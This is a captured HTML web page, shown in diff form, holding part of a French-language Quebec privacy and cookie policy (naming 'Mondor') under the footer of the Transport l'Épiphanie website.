+<td style="width: 50%;">Contenu du message (si des renseignements personnels sont fournis).</td>
+<td style="width: 50%;">Identifier vos besoins afin de répondre à votre demande.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Renseignements professionnels</strong> : Nous vous demandons, dans la mesure du possible, d’éviter de nous transmettre vos renseignements personnels. Veuillez plutôt nous transmettre votre adresse courriel et votre numéro de téléphone de votre lieu de travail.</p>
+<p><strong>Important</strong> : Nous vous demandons de ne pas inclure de renseignements personnels non nécessaires au contenu du message.</p>
+<p><strong>Qui a accès aux renseignements personnels?</strong></p>
+<ul>
+<li>Le personnel de Mondor, dont la fonction le requiert, aura accès, en tout ou en partie, à vos renseignements personnels.</li>
+<li>Nous faisons appel à des prestataires de services qui fournissent des logiciels et des services infonuagiques pour recueillir, conserver et traiter vos renseignements personnels en notre nom.</li>
+<li>Le fournisseur de service de notre boîte courriel.</li>
+</ul>
+<h3>2.2 Lorsque vous nous faites parvenir votre candidature</h3>
+<p><strong>Comment recueillons-nous vos renseignements personnels?</strong></p>
+<p>Nous collectons vos renseignements personnels lorsque vous nous faites parvenir votre candidature en remplissant le formulaire de candidature sur notre site Internet, en nous envoyant votre candidature par courriel ou en postulant via un site Internet spécialisé en recrutement.</p>
+<p><strong>Quelles sont les catégories de renseignements personnels recueillis et à quelles fins les utilisons-nous?</strong></p>
+<table style="border-collapse: collapse; width: 100%; height: 69px;">
+<tbody>
+<tr style="height: 23px;">
+<td style="width: 50%; height: 23px;"><strong>Catégorie de renseignements</strong></td>
+<td style="width: 50%; height: 23px;"><strong>Utilisation</strong></td>
+</tr>
+<tr style="height: 23px;">
+<td style="width: 50%;">Renseignements d’identification : Prénom, nom, courriel, numéro de téléphone.</td>
+<td style="width: 50%;" rowspan="2">Pour communiquer avec vous, pour évaluer votre candidature pour l’emploi ou encore pour nous permettre de gérer tout suivi en lien avec cette candidature.</td>
+</tr>
+<tr style="height: 23px;">
+<td style="width: 50%;">CV et tout autre document pertinent (lettre de motivation, message de présentation, etc.).</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Qui aura accès à vos renseignements personnels?</strong></p>
+<ul>
+<li>Nous restreignons les accès à vos renseignements personnels aux employés de Mondor qui ont besoin d’un tel accès dans le cadre du processus de recrutement (ressources humaines, membres internes de l’équipe relié au poste à combler, soutien technique et administratif).</li>
+<li>Nous faisons appel à des prestataires de services qui fournissent des logiciels et des services infonuagiques pour recueillir, conserver et traiter vos renseignements personnels en notre nom.</li>
+<li>Il est possible que nous partagions vos renseignements personnels avec un prestataire de services de vérification d’antécédents judiciaires et autres vérifications.</li>
+</ul>
+<h2>3. Mineur de moins de 14 ans</h2>
+<p>Nous ne recueillons pas volontairement les renseignements personnels des personnes âgées de moins de 14 ans. Si vous êtes un mineur de moins de 14 ans et que vous naviguez sur notre site Internet, vous ne pouvez pas nous fournir de renseignements personnels sans le consentement exprès d’un parent ou du détenteur de l’autorité parentale. Si vous êtes un parent ou un tuteur et que vous savez que vos enfants nous ont fourni des renseignements personnels, veuillez nous contacter. Si nous découvrons que nous avons recueilli des renseignements personnels d’une personne de moins de 14 ans sans avoir obtenu le consentement du titulaire de l’autorité parentale ou du tuteur, nous prendrons les mesures nécessaires pour supprimer ces renseignements de nos systèmes.</p>
+<h2>4. Quelles sont les technologies d’identification, de profilage ou de localisation que nous utilisons?</h2>
+<p>Nous avons recours à des technologies permettant de vous identifier, de vous localiser ou d’effectuer un profilage à votre endroit aux moyens de l’utilisation de témoins de connexion. Vous pouvez activer ces technologies en acceptant les témoins de connexion identifiés comme servant à l’identification, le profilage ou la localisation sur la banderole de cookies de notre site Web. Pour plus d’informations, nous vous référons à la banderole de cookies de notre site Web ainsi qu’à notre politique sur l’utilisation des témoins de connexion à l’Annexe A des présentes.</p>
+<h2>5. Où conservons-nous les renseignements personnels et sont-ils transférés à l’extérieur du Québec?</h2>
+<p>Certaines informations sont détenues sous format papier et sont conservées dans nos classeurs. L’accès à ces classeurs est limité aux employés de Mondor qui ont en besoin dans le cadre de leurs fonctions.</p>
+<p>Vos renseignements personnels sont principalement détenus de façon virtuelle sur les serveurs de Mondor au Québec ou sur les serveurs de nos prestataires de services avec qui nous faisons affaire et qui se trouvent à l’extérieur du Québec.</p>
+<p>Vos renseignements personnels sont communiqués à l’extérieur du Québec que si nous estimons qu’ils bénéficient d’une protection adéquate. La communication sera également régie par une entente contractuelle appropriée.</p>
+<h2>6. Mesures de sécurité et de protection de vos renseignements personnels</h2>
+<p>Nous déployons des mesures de sécurité adéquates pour protéger vos renseignements personnels. Plus particulièrement, nous avons mis en place des mesures de protection physiques, techniques, et administratives appropriées afin d’assurer la protection de vos renseignements.</p>
+<p>Nous avons notamment déployé des mesures de contrôle en matière d’accès afin de limiter l’accès à vos renseignements personnels uniquement à nos employés qui doivent y avoir accès dans le cadre de leurs fonctions.</p>
+<p>Si vous avez des raisons de croire que des renseignements personnels ont été compromis, veuillez communiquer avec notre Responsable de la protection des renseignements personnels aux coordonnées figurant à l’article 1 de cette Politique.</p>
+<h2>7. Quels sont vos droits à l’égard de vos renseignements personnels?</h2>
+<p>La loi vous confère différents droits à l’égard de vos renseignements personnels. Plus particulièrement, vous disposez des droits suivants :</p>
+<p><strong>7.1 Accès à vos renseignements personnels</strong></p>
+<p>Vous pouvez nous demander si nous détenons des renseignements personnels sur vous et, si oui, vous pouvez demander d’avoir accès à ces renseignements personnels.</p>
+<p><strong>7.2 Rectification</strong></p>
+<p>Vous pouvez nous demander de rectifier tout renseignement personnel incomplet ou inexact que nous détenons à votre sujet.</p>
+<p><strong>7.3 Retrait du consentement</strong></p>
+<p>Dans certains cas, vous pouvez retirer votre consentement à la communication ou à l’utilisation des renseignements personnels que nous détenons à votre sujet. Vous comprenez toutefois que dans un tel cas, nous ne pourrons plus traiter vos demandes conformément aux articles 2.1 et 2.2 de la présente Politique.</p>
+<p><strong>7.4 Portabilité</strong></p>
+<p>Vous pouvez nous demander que vos renseignements personnels vous soient communiqués ou qu’ils soient transférés à une autre organisation dans un format technologique structuré et couramment utilisé.</p>
+<h2>8. Comment pouvez-vous exercer vos droits?</h2>
+<p>Pour exercer l’un ou l’autre de vos droits ci-dessus, veuillez communiquer avec notre Responsable de la protection des renseignements personnels aux coordonnées figurant à l’article 1 de cette Politique.</p>
+<h2>9. Comment formuler une plainte concernant notre traitement de vos renseignements personnels?</h2>
+<p>Mondor prend très au sérieux les demandes, les plaintes et les commentaires sur la façon dont nous traitons vos renseignements personnels. Nous vous invitons à communiquer avec notre Responsable de la protection des renseignements personnels pour soumettre des plaintes ou des commentaires quant à nos pratiques en matière de protection de vos renseignements personnels.</p>
+<p>Votre plainte sera examinée par notre Responsable de la protection des renseignements personnels, qui déterminera si le traitement de vos renseignements personnels est conforme à notre programme de protection des renseignements personnels, ainsi qu’à toute loi applicable.</p>
+<p>Vous pouvez également déposer une plainte auprès de la Commission d’accès à l’information du Québec en utilisant <a href="https://view.officeapps.live.com/op/view.aspx?src=https%3A%2F%2Fwww.cai.gouv.qc.ca%2Fuploads%2Fpdfs%2FCAI_FO_Plainte_Citoyen.docx&amp;wdOrigin=BROWSELINK" target="_blank" rel="noopener">le formulaire disponible sur le site Web de la Commission</a>. Toutefois, nous vous invitons à communiquer d’abord avec notre Responsable de la protection des renseignements personnels.</p>
+<h2>10. Sites ou services externes</h2>
+<p>Cette Politique ne s’applique pas aux sites Internet, aux pages ou aux applications de tiers auxquels il est possible d’accéder par le biais de notre site Internet. Si vous suivez de tels liens, ces sites ou services tiers auront probablement leurs propres politiques sur la protection des renseignements personnels que vous devrez examiner avant de soumettre vos renseignements personnels.</p>
+<h2>11. Comment mettons-nous à jour la présente Politique?</h2>
+<p>Afin d’assurer la clarté et la transparence de notre Politique de confidentialité, il est possible qu’elle soit modifiée de temps à autre. Les modifications seront publiées sur le site Internet de Mondor, accompagnées de la date de la dernière mise à jour. Les modifications entreront en vigueur à la date de la dernière mise à jour.</p>
+<h2>Sommaire de notre politique interne de gouvernance en matière de protection des renseignements personnels</h2>
+<p>Mondor s’engage à protéger vos renseignements personnels tout au long de leur cycle de vie, conformément à ses pratiques en matière de protection des renseignements personnels et conformément aux exigences contenues dans les lois applicables.</p>
+<p>En plus de notre politique de confidentialité, Mondor s’est dotée d’une politique interne de gouvernance relativement aux renseignements personnels laquelle a pour objet d’énoncer les principes encadrant la protection des renseignements personnels dans le cadre de ses opérations.</p>
+<p>Les objectifs de notre politique interne de gouvernance sont :</p>
+<ol>
+<li>Assurer un traitement adéquat, sécuritaire, conforme et transparent de vos renseignements personnels;</li>
+<li>Établir les lignes directrices entourant le traitement des renseignements personnels par Mondor tout au long de leur cycle de vie; et</li>
+<li>Définir les rôles et responsabilités du responsable de la protection des renseignements personnels et ceux de notre personnel.</li>
+</ol>
+<h2>1. Rôles et responsabilités</h2>
+<p>Puisque le respect de vos renseignements personnels est l’affaire de tous au sein de Mondor, notre Responsable de la protection des renseignements personnels est soutenu par une équipe sensibilisée à la protection des renseignements personnels de même qu’aux droits des personnes concernées.</p>
+<p>Chaque membre de notre personnel a un rôle à jouer afin que nous puissions agir conformément à notre programme de protection des renseignements personnels. D’ailleurs, chaque membre de notre personnel est appelé à :</p>
+<ol>
+<li>Adresser au Responsable de la protection des renseignements personnels toute question ou tout commentaire sur la manière dont nous traitons ou devrions traiter vos renseignements personnels;</li>
+<li>Participer à des activités de formation et de sensibilisation sur l’importance que nous accordons à la protection des renseignements personnels.</li>
+</ol>
+<h2>2. Principes directeurs en matière de gouvernance</h2>
+<p>Mondor reconnaît l’importance de la protection, de la confidentialité et de la sécurité des renseignements personnels qu’elle traite dans le cours de ses activités et de l’importance de sensibiliser son personnel et ses partenaires à ce sujet.</p>
+<p>Mondor a préparé des lignes directrices en matière de bonnes pratiques et de pratiques interdites concernant la manière dont nous pouvons traiter vos renseignements personnels, par exemple :</p>
+<ol>
+<li>Nous déterminons les finalités et les objectifs poursuivis avant de recueillir vos renseignements personnels. Par la suite, vos renseignements personnels ne sont utilisés que conformément à ces finalités et objectifs;</li>
+<li>Nous cherchons à recueillir que le strict minimum afin d’atteindre les finalités identifiées;</li>
+<li>Nous nous efforçons d’obtenir votre consentement au moment de recueillir vos renseignements personnels, et, lorsqu’il s’agit de renseignements personnels sensibles, nous cherchons à obtenir votre consentement de manière expresse;</li>
+<li>Nous affichons notre politique de confidentialité de manière claire et visible lorsque nous recueillons vos renseignements personnels par le biais d’un moyen technologique;</li>
+<li>Nous nous assurons que nos produits ou services technologiques dotés de paramètres de confidentialité offrent par défaut le niveau de confidentialité le plus élevé, sans qu’aucune intervention de votre part ne soit requise;</li>
+<li>Nous n’utilisons pas de technologies qui permettent l’identification, la localisation ou le profilage sans avoir à divulguer cette pratique et vous avoir informé comment activer de telles fonctionnalités;</li>
+<li>Nous procédons à des évaluations des facteurs relatifs à la vie privée lorsque requis par la loi, et lorsque nous considérons que le traitement de vos renseignements personnels comporte des risques pour votre vie privée;</li>
+<li>Dans la mesure du possible, nous limitons l’accès à vos renseignements personnels uniquement aux membres de notre personnel et à nos fournisseurs de services qui ont besoin d’avoir accès à ceux-ci dans le cadre de nos opérations;</li>
+<li>Nous ne communiquons pas vos renseignements personnels à des tiers sans avoir votre consentement, sauf lorsque permis par la loi.</li>
+</ol>
+<h2>3. Incident de confidentialité</h2>
+<p>Mondor a mis en place un processus afin de répondre et de traiter les incidents de confidentialité.</p>
+<p>En vertu de ce processus, Mondor doit prendre des mesures raisonnables pour réduire le risque de préjudice sérieux et revoir ses pratiques afin de prévenir les incidents de confidentialité.</p>
+<p>Mondor documente tous les incidents de confidentialité dans son registre des incidents de confidentialité et adaptera son programme de protection des renseignements personnels au besoin, suivant un incident de confidentialité.</p>
+<h2>ANNEXE A</h2>
+<h3>Politique sur l’utilisation de fichiers témoins et des outils d’analytique</h3>
+<p>Cette Politique concernant l’utilisation des fichiers témoins et des outils d’analytique (« <strong>Politique de fichiers témoins</strong> ») décrit comment Mondor utilise des fichiers témoins, des balises Web ainsi que d’autres technologies d’identification, de profilage et de localisation (« <strong>fichiers témoins </strong>») sur son site Internet.</p>
+<p>Notre Politique de témoins complète notre Politique de confidentialité et doit donc être lue de concert avec celle-ci.</p>
+<h2>1. Que devez-vous savoir sur les fichiers témoins et les balises Web?</h2>
+<p><strong>1.1. Qu’est-ce qu’un fichier témoin et que sont les balises Web?</strong></p>
+<p>Les fichiers témoins sont de petits fichiers texte qui sont téléchargés sur votre appareil lorsque vous visitez un site Internet, utilisez une application mobile ou téléchargez un courriel. Les fichiers témoins permettent à un site Internet de reconnaître un appareil et de stocker des informations (par exemple sur vos préférences, votre utilisation du site Internet) et de lire ces informations chaque fois que vous accédez au site Internet.</p>
+<p>Il existe deux types de fichiers témoins : (i) primaire ; et (ii) de tiers. Essentiellement, les deux types sont techniquement identiques et exécutent les mêmes fonctions ; la principale différence réside dans la manière dont ils sont créés et comment ils sont ensuite utilisés.</p>
+<p><strong>Fichiers témoins primaires.</strong> Les fichiers témoins primaires sont créés par le site Internet que vous visitez. Un site Internet ne peut accéder qu’aux fichiers témoins qu’il a lui-même placés sur votre appareil, de sorte que, par exemple, les fichiers témoins placés lors de votre visite sur un moteur de recherche ne sont pas accessibles par nos sites Internet.</p>
+<p><strong>Fichiers témoins de tiers.</strong> Les fichiers témoins de tiers sont créés par un autre site que celui que vous visitez et sont principalement utilisés à des fins de profilage et de publicités comportementales. Ils permettent également aux propriétaires de sites Internet de fournir certains services. Ce type de fichiers témoins peut être placé par ce que l’on appelle une balise Web (plus d’informations à ce sujet ci-dessous). Puisqu’un site Internet ne peut accéder qu’aux fichiers témoins qu’il a lui-même placés, nous ne pouvons pas accéder aux fichiers témoins de tiers placés sur l’un ou l’autre de nos sites Internet.</p>
+<p>Une balise Web, souvent appelée « pixel invisible », est une image transparente, habituellement de 1 pixel x 1 pixel, qui est placée sur un site Web ou dans un courriel pour évaluer la manière dont un utilisateur interagit avec un contenu spécifique. Les balises Web fonctionnent en envoyant des informations avec la demande au serveur Web du tiers lors de la demande d’affichage de la balise Web.</p>
+<p><strong>1.2. Que pouvez-vous faire pour contrôler les fichiers témoins placés sur votre ordinateur?</strong></p>
+<p>La plupart des navigateurs vous permettent de configurer comment les fichiers témoins sont acceptés par votre navigateur. Gardez à l’esprit que la modification de vos paramètres de fichiers témoins peut empêcher certains sites Internet de fonctionner correctement. Veuillez consulter la documentation de votre navigateur pour savoir comment configurer les paramètres concernant les fichiers témoins.</p>
+<p>Vous pouvez également utiliser le mode privé ou incognito de votre navigateur qui supprimera automatiquement tous les fichiers témoins placés lors de votre utilisation du mode privé, lorsque tous les onglets du mode privé seront fermés. Consultez la rubrique d’aide de votre navigateur pour en savoir plus sur le fonctionnement du mode privé.</p>
+<p>Certains navigateurs récents ont une fonctionnalité intégrée pour bloquer ou contrôler le contenu permettant le profilage. Nous vous invitons à consulter la section d’aide de votre navigateur pour voir si une telle fonctionnalité est offerte. Certains navigateurs peuvent avoir des extensions créées par des tiers qui peuvent être utilisées pour gérer et supprimer les fichiers témoins. Si vous décidez d’utiliser des extensions, nous vous invitons à prêter une attention particulière aux extensions que vous installez et aux autorisations dont celles-ci ont besoin.</p>
+<p>Vous pouvez également désactiver notre utilisation de fichiers témoins et de technologies similaires qui nous permettent de faire du profilage et afficher de la publicité sur les sites de tiers.</p>
+<h2>2. Comment utilisons-nous les fichiers témoins sur notre site Internet?</h2>
+<p><strong>2.1 Pourquoi utilisons-nous des fichiers témoins sur notre site Internet?</strong></p>
+<p>Mondor peut utiliser des fichiers témoins notamment pour améliorer votre expérience utilisateur, activer certaines fonctionnalités et analyser le trafic sur notre site Internet. Pour plus d’information sur les fichiers témoins utilisés, veuillez consulter la banderole de témoins de notre site Internet.</p>
+<h2>3. Outils d’analytique pour mesurer l’interaction avec notre site Internet</h2>
+<p><strong>3.1 Ce que vous devez savoir sur l’analytique</strong></p>
+<p>Les outils d’analytique sont utilisés afin de recueillir, analyser et mesurer le trafic Web et les visites des utilisateurs sur notre site Internet à des fins de compréhension et d’optimisation de l’utilisation de celui-ci. Les outils d’analytique fonctionnent grâce à la collecte d’informations à propos des interactions d’une personne qui visite avec une ou plusieurs pages Web. Ces informations incluent, par exemple, le nombre moyen de pages visitées par un utilisateur.</p>
+<p><strong>3.2 Quels sont les outils d’analytique que nous utilisons sur notre site Internet?</strong></p>
+<p>Mondor peut utiliser des outils d’analytique pour comprendre comment les visiteurs interagissent avec notre site Internet. Pour plus d’information sur les fichiers témoins utilisés, veuillez consulter la banderole de témoins de notre site Internet.</p>
+<p><strong>3.3 Que pouvez-vous faire pour empêcher un site Internet de recueillir des informations analytiques?</strong></p>
+<p>Vous pouvez prendre différentes mesures pour empêcher un site Internet de recueillir des détails concernant votre navigation. Vous pouvez :</p>
+<ul>
+<li>Contrôler les fichiers témoins acceptés par votre navigateur (voir section 1.2) ;</li>
+<li>Installer des extensions sur votre navigateur afin de désactiver l’utilisation d’outils d’analytique.</li>
+</ul>
+</div>
+    </div>
+
+  </section>
+
+    </main>
+
+    
+<footer class="" id="contact">
+
+  <div class="container-fluid-px bg-blue-1 py-[3rem] lg:py-[7.5rem] text-white">
+    <div class="container-1220">
+
+      <div class="grid grid-cols-1 lg:grid-cols-12 gap-grid-gutter">
+
+        <div class="col-span-5">
+          <div class="h2">Contactez-nous pour toute question ou pour planifier un transport</div>
+              <a class="btn-primary mt-[1.5rem]" href="https://transportlepiphanie.ca/contact/" target="_self">
+    <span>Contactez-nous</span>
+  </a>
+        </div>
+
+        <div class="col-span-3 mt-md  lg:mt-0">
+
+          <div class="flex items-start gap-xs">
+
+            <svg class="w-[40px]" xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 40 40">
+              <path fill="#fff" d="M37.223 1.426H22.838a.586.586 0 1 0 0 1.172h14.385c.885 0 1.605.72 1.605 1.606V19.29c0 .885-.72 1.605-1.605 1.605h-2.298a.586.586 0 0 0-.343.112l-3.996 2.894v-2.42a.586.586 0 0 0-.585-.585H17.282c-.885 0-1.605-.72-1.605-1.606V4.204c0-.886.72-1.606 1.605-1.606h3.002a.586.586 0 1 0 0-1.172h-3.002a2.78 2.78 0 0 0-2.777 2.778V19.29a2.78 2.78 0 0 0 2.777 2.777h12.132v2.981a.586.586 0 0 0 .93.475l4.77-3.456h2.108A2.78 2.78 0 0 0 40 19.291V4.204a2.78 2.78 0 0 0-2.777-2.778Z"/>
+              <path fill="#fff" d="M34.03 32.395a2.73 2.73 0 0 0-1.413-2.038l-2.605-1.42a.586.586 0 1 0-.56 1.03l2.605 1.42a1.57 1.57 0 0 1 .813 1.18c.068.506-.104 1-.473 1.355l-.384.368-9.619-5.412 1.13-.994a1.537 1.537 0 0 1 1.748-.195l1.626.886a.586.586 0 1 0 .56-1.03l-1.625-.885a2.713 2.713 0 0 0-3.082.344l-2.635 2.317a1.548 1.548 0 0 1-1.915.107c-3.968-2.78-6.849-5.838-8.809-9.349a1.544 1.544 0 0 1 .23-1.82l2.085-2.204c.778-.824.96-2.057.454-3.07L8.65 5.968a2.733 2.733 0 0 0-1.97-1.48 2.734 2.734 0 0 0-2.367.688l-1.332 1.23a9.202 9.202 0 0 0-2.82 5.09 9.094 9.094 0 0 0 .793 5.774 45.148 45.148 0 0 0 2.138 3.846.586.586 0 0 0 .996-.618 44.008 44.008 0 0 1-2.09-3.762c-1.54-3.117-.853-6.94 1.664-9.36l5.284 9.893-.177.187a2.711 2.711 0 0 0-.401 3.195c2.048 3.669 5.044 6.854 9.16 9.738a2.718 2.718 0 0 0 3.361-.187l.572-.503 9.668 5.44-.01.01a8.064 8.064 0 0 1-9.289 1.355c-6.641-3.433-12.04-7.97-16.047-13.488a.586.586 0 1 0-.949.689c4.116 5.666 9.653 10.322 16.458 13.84a9.204 9.204 0 0 0 4.23 1.03 9.243 9.243 0 0 0 6.409-2.581l1.277-1.226a2.731 2.731 0 0 0 .82-2.372ZM4.55 6.551l.558-.516c.37-.341.866-.485 1.362-.395.495.091.908.401 1.132.851l3.51 7.019a1.54 1.54 0 0 1-.258 1.74l-1.059 1.12-5.245-9.819ZM35.277 12.303a2.049 2.049 0 0 0-2.047-2.047 2.049 2.049 0 0 0-2.046 2.047c0 1.128.918 2.046 2.046 2.046a2.05 2.05 0 0 0 2.047-2.046Zm-2.922 0a.876.876 0 0 1 1.75 0 .876.876 0 0 1-1.75 0ZM29.3 12.303a2.049 2.049 0 0 0-2.047-2.047 2.049 2.049 0 0 0-2.047 2.047 2.05 2.05 0 0 0 2.047 2.046 2.049 2.049 0 0 0 2.047-2.046Zm-2.922 0a.876.876 0 0 1 1.75 0 .876.876 0 0 1-1.75 0ZM19.23 12.303c0 1.128.917 2.046 2.046 2.046a2.049 2.049 0 0 0 2.047-2.046 2.049 2.049 0 0 0-2.047-2.047 2.049 2.049 0 0 0-2.047 2.047Zm2.046-.875a.876.876 0 0 1 0 1.75.876.876 0 0 1 0-1.75Z"/>
+            </svg>
+
+            <div class="space-y-[1.5rem]">
+
+              <div class="">
+                <div class="font-bold">Ligne direct Montréal</div>
+                <a class="link-white" href="tel:450-588-2596">450-588-2596</a>
+              </div>
+
+              <div class="">
+                <div class="font-bold">Ligne sans frais</div>
+                <a class="link-white" href="tel:1800-663-2859">1800-663-2859</a>
+              </div>
+
+            </div>
+
+          </div>
+
+        </div>
+
+        <div class="col-span-4 space-y-[1.5rem]">
+
+          <div class="flex items-start gap-xs">
+            <svg class="w-[40px]" xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 40 40">
+              <g fill="#fff" clip-path="url(#a)">
+                <path d="m39.962 39.206-5.86-15.435a.586.586 0 0 0-.26-.303l-6.24-3.516 1.821-2.889a11.107 11.107 0 0 0 1.71-5.93C31.133 4.994 26.139 0 20 0 13.86 0 8.867 4.994 8.867 11.133a11.1 11.1 0 0 0 1.71 5.93l1.822 2.89-6.241 3.515a.586.586 0 0 0-.26.303L.038 39.206a.586.586 0 0 0 .836.719l9.419-5.307 9.42 5.307c.178.1.396.1.575 0l9.419-5.307 9.42 5.307a.585.585 0 0 0 .835-.719Zm-19.376-8.838c.367-.13.684-.378.9-.72l5.018-7.956 2.54 11.954-8.458 4.765v-8.043Zm-9.017-13.93a9.93 9.93 0 0 1-1.53-5.305c0-5.493 4.469-9.961 9.961-9.961s9.96 4.468 9.96 9.96a9.937 9.937 0 0 1-1.528 5.306c-.078.124-7.798 12.367-7.933 12.579l-.004.005a.584.584 0 0 1-.991 0c-.079-.123-7.815-12.39-7.933-12.58l-.002-.004Zm-4.651 7.947 5.462-3.077-.952 4.477a.586.586 0 0 0 1.147.244l.921-4.336 5.018 7.957c.216.34.534.589.9.718v8.043l-8.458-4.765 1.131-5.325a.586.586 0 0 0-1.146-.244l-1.166 5.488-8.067 4.544 5.21-13.724Zm23.307 9.18L27.62 21.308l5.462 3.077 5.21 13.724-8.067-4.544Z"/>
+                <path d="M26.445 11.133A6.453 6.453 0 0 0 20 4.688a6.453 6.453 0 0 0-6.445 6.445A6.453 6.453 0 0 0 20 17.578a6.453 6.453 0 0 0 6.445-6.445Zm-11.718 0A5.28 5.28 0 0 1 20 5.859a5.28 5.28 0 0 1 5.273 5.274A5.28 5.28 0 0 1 20 16.406a5.28 5.28 0 0 1-5.273-5.273Z"/>
+                <path d="M24.102 11.133A4.106 4.106 0 0 0 20 7.03a4.106 4.106 0 0 0-4.102 4.102A4.106 4.106 0 0 0 20 15.234a4.106 4.106 0 0 0 4.102-4.101Zm-7.032 0A2.933 2.933 0 0 1 20 8.203a2.933 2.933 0 0 1 2.93 2.93 2.933 2.933 0 0 1-2.93 2.93 2.933 2.933 0 0 1-2.93-2.93Z"/>
+              </g>
+              <defs>
+                <clipPath id="a">
+                  <path fill="#fff" d="M0 0h40v40H0z"/>
+                </clipPath>
+              </defs>
+            </svg>
+            <a href="https://www.google.com/maps/place/26+Rue+de+l'Industrie,+L'Assomption,+QC+J5W+2V1/@45.826018,-73.4449657,17z/data=!3m1!4b1!4m5!3m4!1s0x4cc8e914e3d47b93:0x4091a2bf44f9162!8m2!3d45.826018!4d-73.4449657" class="link-white" target="_blank">26, rue de l'Industrie<br />
+L’Assomption,<br />
+Qc J5W 2V1</a>
+          </div>
+
+          <div class="flex items-center gap-xs">
+            <svg class="w-[40px] min-w-[40px]" viewbox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <g clip-path="url(#clip0_99_1871)">
+                <path d="M37.9487 6.66663H2.05133C0.923047 6.66663 0 7.58967 0 8.71788V31.282C0 32.4101 0.923047 33.3333 2.05133 33.3333H37.9487C39.0769 33.3333 40.0001 32.4103 40.0001 31.282V8.71788C40 7.58967 39.077 6.66663 37.9487 6.66663ZM37.1789 8.20499L21.18 20.2051C20.8923 20.424 20.4508 20.561 19.9999 20.559C19.5491 20.561 19.1077 20.424 18.8199 20.2051L2.82102 8.20499H37.1789ZM28.6328 20.9969L37.3508 31.7662C37.3595 31.777 37.3702 31.7852 37.3795 31.795H2.62047C2.62969 31.7848 2.64047 31.777 2.64922 31.7662L11.3672 20.9969C11.6343 20.6667 11.5837 20.1826 11.2528 19.9148C10.9226 19.6477 10.4384 19.6983 10.1713 20.0287L1.53844 30.6928V9.16655L17.8973 21.4358C18.5123 21.8937 19.2604 22.0953 19.9998 22.0973C20.7383 22.0958 21.487 21.8942 22.1023 21.4358L38.4613 9.16655V30.6926L29.8287 20.0287C29.5615 19.6984 29.0769 19.6476 28.7471 19.9148C28.4163 20.1819 28.3655 20.6667 28.6328 20.9969Z" fill="white"/>
+              </g>
+              <defs>
+                <clipPath id="clip0_99_1871">
+                  <rect width="40" height="40" fill="white"/>
+                </clipPath>
+              </defs>
+            </svg>
+
+            <div class="mt-[0.5rem] lg:mt-0">
+              <a class="link-white break-all" href="mailto:dispatchlepiphanie@transportlepiphanie.ca">dispatchlepiphanie@transportlepiphanie.ca</a>
+            </div>
+          </div>
+
+        </div>
+
+      </div>
+
+    </div>
+  </div>
+
+  <div class="container-fluid-px bg-gray-2 text-white py-xs text-sm font-Kumbh text-center lg:text-left">
+
+    <div class="container-1220">
+      <div class="lg:flex">
+
+                  <p>Tous droits réservés 2025 © Transport l'Épiphanie inc. | <a href="https://transportlepiphanie.ca/politique-de-confidentialite/">Politique de confidentialité</a></p>
+        
+        <div class="lg:ml-auto">
+          <a href="https://agencearobas.ca/" target="_blank" class="group"> 
+
+                          Fait avec
+            
+            <span class="w-[10px] inline-block text-blue-2 group-hover:text-blue-1">
+              <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 9.553 8.359">
+                <path fill="currentColor" d="M8.626.571a2.551 2.551 0 0 0-3.481.254l-.368.379-.368-.379A2.551 2.551 0 0 0 .928.571a2.679 2.679 0 0 0-.185 3.881l3.61 3.728a.585.585 0 0 0 .845 0l3.61-3.728A2.677 2.677 0 0 0 8.625.573Z"/>
+              </svg>
+            </span>
+
+                          par Arobas Web & numérique
+            
+          </a>
+        </div>
+
+      </div>
+    </div>
+
+  </div>
+</footer>
+
+
+        <script type="speculationrules">
+{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"\/*"},{"not":{"href_matches":["\/wp-*.php","\/wp-admin\/*","\/wp-content\/uploads\/*","\/wp-content\/*","\/wp-content\/plugins\/*","\/wp-content\/themes\/epiphanie\/*","\/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
+</script>
+
+
+    <script src="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/scripts/manifest.js?id=86712bb6632831f087582883687ef2bf"></script>
+    <script src="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/scripts/vendor.js?id=892c6c940db7ac00b9e74fe92579b46a"></script>
+    <script src="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/scripts/main.js?id=e20b7333b2c369b12693c81fa68b3765"></script>
+
+  </body>
+</html>
